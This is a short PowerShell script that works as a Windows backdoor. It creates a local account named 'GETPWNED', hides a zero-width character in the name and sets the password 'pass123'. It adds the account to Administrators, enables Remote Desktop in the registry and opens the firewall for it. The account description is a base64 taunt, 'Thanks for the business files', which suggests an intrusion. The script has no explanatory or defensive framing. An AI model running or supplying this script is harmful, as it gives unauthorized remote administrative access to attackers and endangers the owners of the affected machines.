$E = [ADSI]"WinNT://${env:Computername}"
$L = ConvertTo-SecureString "pass123" -AsPlainText -Force
$A = "VGhhbmtzIGZvciB0aGUgYnVzaW5lc3MgZmlsZXM="
$R = $E.Children | where {$_.SchemaClassName -eq 'user'} | % {$_.name[0].ToString()}
$W = "GETPWNED​"
if($R -contains $W) {Remove-LocalUser -Name $W}
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
New-LocalUser $W -Password $L -Des $A
Add-LocalGroupMember -G "Administrators" -M $W
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
